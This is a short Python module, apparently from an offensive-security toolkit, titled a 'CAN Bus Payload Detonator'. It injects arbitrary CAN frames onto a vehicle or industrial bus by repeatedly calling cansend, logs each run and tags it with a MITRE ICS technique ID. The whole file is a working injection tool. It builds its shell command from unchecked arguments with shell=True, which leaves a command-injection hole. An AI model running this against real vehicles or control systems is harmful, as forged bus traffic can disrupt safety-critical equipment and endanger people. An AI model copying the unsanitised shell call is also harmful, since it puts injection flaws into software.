# modules/attacks/can_bus_payload_detonator.py

import argparse
import os
import json
import time
import subprocess
from datetime import datetime

LOG_PATH = "results/can_detonation_log.json"
MITRE_TTP = "T0851"

def log_detonation(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def detonate(interface, can_id, hex_data, count):
    try:
        for _ in range(count):
            cmd = f"cansend {interface} {can_id}#{hex_data}"
            subprocess.run(cmd, shell=True, timeout=2)
            time.sleep(0.1)
        log_detonation({
            "timestamp": datetime.utcnow().isoformat(),
            "interface": interface,
            "can_id": can_id,
            "data": hex_data,
            "count": count,
            "ttp": MITRE_TTP
        })
        return True
    except Exception:
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CAN Bus Payload Detonator")
    parser.add_argument("--iface", required=True, help="CAN interface (e.g., can0)")
    parser.add_argument("--canid", required=True, help="Target CAN ID (e.g., 7DF)")
    parser.add_argument("--data", required=True, help="Hex data (e.g., DEADBEEF)")
    parser.add_argument("--count", type=int, default=5, help="Number of packets to send")
    args = parser.parse_args()

    if detonate(args.iface, args.canid, args.data, args.count):
        print("[+] CAN payloads injected")
    else:
        print("[!] CAN injection failed")
